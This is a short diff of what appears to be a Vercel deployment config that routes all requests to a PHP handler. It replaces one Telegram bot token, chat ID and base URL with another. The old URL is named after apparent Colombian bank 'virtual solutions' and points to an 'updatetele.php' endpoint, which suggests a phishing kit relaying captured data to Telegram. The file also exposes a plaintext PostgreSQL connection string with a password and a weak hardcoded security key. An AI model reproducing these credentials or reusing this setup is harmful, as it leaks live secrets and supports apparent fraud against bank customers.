@@ -12,9 +12,9 @@
     { "src": "/(.*)", "dest": "/api/index.php" }
   ],
   "env": {
-    "BOT_TOKEN":    "8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo",
-    "CHAT_ID":      "-5180034812",
-    "BASE_URL":    "https://solucionesvirtualesbancol.vercel.app/updatetele.php",
+    "BOT_TOKEN":    "8772319496:AAEDNgO_Xhy-SPIMEA7g5u59oI0UlJVKbiQ",
+    "CHAT_ID":      "-5596275936",
+    "BASE_URL":    "https://tricoprueba2.vercel.app/updatetele.php",
     "SECURITY_KEY": "secure_key_123",
     "DATABASE_URL": "postgresql://neondb_owner:npg_iHg1Z9yDGOQw@ep-jolly-rice-aizz7hvg-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
   }
